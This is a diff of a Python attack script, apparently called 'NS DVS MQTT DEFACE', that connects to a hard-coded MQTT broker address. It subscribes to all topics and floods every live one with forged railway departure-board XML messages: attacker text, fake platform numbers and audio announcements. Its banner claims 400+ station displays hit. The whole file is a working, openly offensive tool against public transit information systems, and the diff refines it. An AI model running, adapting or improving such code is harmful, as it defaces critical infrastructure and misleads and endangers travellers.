@@ -1,15 +1,13 @@
 #!/usr/bin/env python3
 """
-NS DVS MQTT DEFACE v2.3 - PURE PYTHON NO EXTERNAL BULLSHIT
-TRUSTEDF57 - Matrix + Audio + Binari - 100% WORKING
-NO torsocks NO mosquitto_pub - DIRECT MQTT PUBLISH
+NS DVS MQTT DEFACE v2.4 - PERFECT
+TRUSTEDF57 - MOSTRA LIVE + ATTACCHI SUCCESSIVI
 """
 
 import paho.mqtt.client as mqtt
 import threading
 import time
 import random
-import xml.etree.ElementTree as ET
 
 HOST = "78.47.35.220"
 PORT = 1883
@@ -30,7 +28,6 @@ class DVSMatrixHack:
         self.setup_publisher()
     
     def setup_publisher(self):
-        """Pure Python MQTT publisher NO external deps"""
         self.publish_client = mqtt.Client()
         self.publish_client.connect(HOST, PORT, 60)
         self.publish_client.loop_start()
@@ -48,7 +45,7 @@ class DVSMatrixHack:
     
     def audio_payload(self):
         msg = random.choice(MESSAGES)
-        return f'''<?xml version="1.0" encoding="UTF-8"?>
+        return f'''<?xml version="1.0"?>
 <ns1:PutReisInformatieBoodschapIn xmlns:ns1="urn:ndov:cdm:trein:reisinformatie:messages:5">
 <ns2:ReisInformatieProductDVS Versie="6.2" xmlns:ns2="urn:ndov:cdm:trein:reisinformatie:data:4">
 <ns2:DynamischeVertrekStaat>
@@ -56,7 +53,7 @@ class DVSMatrixHack:
 <ns2:PresentatieOpmerkingen>
 <ns2:Uitingen Taal="nl">
 <ns2:Uiting Prioriteit="1">{msg}</ns2:Uiting>
-<ns2:Uiting Prioriteit="2">AUDIO HACK SUCCESSO</ns2:Uiting>
+<ns2:Uiting Prioriteit="2">AUDIO SUCCESSO</ns2:Uiting>
 </ns2:Uitingen>
 </ns2:PresentatieOpmerkingen>
 </ns2:DynamischeVertrekStaat>
@@ -66,7 +63,7 @@ class DVSMatrixHack:
     def matrix_payload(self):
         matrix_text = self.generate_matrix_screen().replace('\n', ' | ')
         msg2 = MESSAGES[1]
-        return f'''<?xml version="1.0" encoding="UTF-8"?>
+        return f'''<?xml version="1.0"?>
 <ns1:PutReisInformatieBoodschapIn xmlns:ns1="urn:ndov:cdm:trein:reisinformatie:messages:5">
 <ns2:ReisInformatieProductDVS Versie="6.2" xmlns:ns2="urn:ndov:cdm:trein:reisinformatie:data:4">
 <ns2:DynamischeVertrekStaat>
@@ -80,29 +77,28 @@ class DVSMatrixHack:
 <ns2:TreinVertrekSpoor>
 <ns2:SpoorNummer>666</ns2:SpoorNummer>
 </ns2:TreinVertrekSpoor>
-<ns2:ExacteVertrekVertraging>PT99H</ns2:ExacteVertrekVertraging>
 </ns2:DynamischeVertrekStaat>
 </ns2:ReisInformatieProductDVS>
 </ns1:PutReisInformatieBoodschapIn>'''
     
     def publish_attack(self, topic, payload, attack_type):
-        """DIRECT MQTT PUBLISH - NO subprocess"""
         try:
-            self.publish_client.publish(topic, payload, qos=2)
-            self.attack_count += 1
-            print(f"✅ #{self.attack_count} {attack_type} → {topic[-25:]}")
-            return True
+            result = self.publish_client.publish(topic, payload, qos=2)
+            if result.rc == mqtt.MQTT_ERR_SUCCESS:
+                self.attack_count += 1
+                print(f"✅ #{self.attack_count} {attack_type} → {topic[-20:]}")
         except:
             pass
-        return False
     
     def full_attack(self, topic):
+        print(f"🔥 ATTACK START → {topic[-40:]}")
         self.publish_attack(topic, self.audio_payload(), "AUDIO")
-        time.sleep(0.2)
+        time.sleep(0.1)
         self.publish_attack(topic, self.matrix_payload(), "MATRIX")
-        time.sleep(0.2)
+        time.sleep(0.1)
         bin_payload = self.matrix_payload().replace("666", "999")
         self.publish_attack(topic, bin_payload, "BINARI")
+        print(f"   → TOTAL 3 ATTACKS SENT")
     
     def on_message(self, client, userdata, msg):
         topic = msg.topic
@@ -110,7 +106,7 @@ class DVSMatrixHack:
             return
         self.discovered_topics[topic] = True
         self.topic_count += 1
-        print(f"🎯 #{self.topic_count} LIVE → {topic[-60:]}")
+        print(f"🎯 #{self.topic_count} LIVE TOPIC → {topic[-60:]}")
         threading.Thread(target=self.full_attack, args=(topic,), daemon=True).start()
     
     def start(self):
@@ -120,9 +116,8 @@ class DVSMatrixHack:
         client.subscribe(WILDCARD_TOPIC, qos=2)
         print("""
 ╔══════════════════════════════════════════════════════╗
-║  NS DVS v2.3 PURE PYTHON - NO EXTERNAL DEPENDENCIES  ║
-║           TRUSTEDF57 DIRECT MQTT PUBLISH              ║
-║    400+ Tabelloni MATRIX + AUDIO + BINARI             ║
+║           NS DVS v2.4 - LIVE + ATTACKS                ║
+║     TRUSTEDF57 - 400+ Tabelloni colpite              ║
 ╚══════════════════════════════════════════════════════╝
         """)
         client.loop_forever()
